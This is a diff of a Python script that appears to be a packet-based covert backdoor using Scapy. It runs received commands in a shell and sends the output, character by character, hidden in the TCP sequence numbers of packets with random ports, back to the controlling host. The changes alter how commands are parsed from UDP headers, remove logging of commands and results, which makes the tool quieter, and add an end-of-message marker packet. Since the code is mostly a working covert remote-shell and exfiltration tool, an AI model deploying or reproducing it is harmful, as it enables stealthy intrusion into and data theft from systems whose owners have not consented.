@@ -52,7 +52,7 @@ def checkCommand(ip, proto, data, pacType):
 	if pacType == 'tcp':
 		character = proto[2]
 	elif pacType == 'udp':
-		character = proto[6]
+		character = proto[3]
 	elif pacType == 'icmp':
 		character = proto[2]
 
@@ -67,7 +67,6 @@ def executeCommand(srcAddress):
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
-	print command + " from " + srcAddress
 	
 	# directory = os.system("pwd")
 	# results = os.system(command)
@@ -76,8 +75,6 @@ def executeCommand(srcAddress):
 	directory = subprocess.Popen("pwd", shell=True, stdout=PIPE).stdout.read() 
 	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
 	shell = "["+directory[:-1] + "]# " + results
-
-	print shell
 
 	sendThread = threading.Thread(target=sendResults, args=(str(shell),srcAddress))
 	sendThread.daemon = True
@@ -90,3 +87,5 @@ def sendResults(results, address):
 	# for each character, send a packet to address
 	for c in results:
 		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)), verbose=0)
+
+	send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=15), verbose=0)
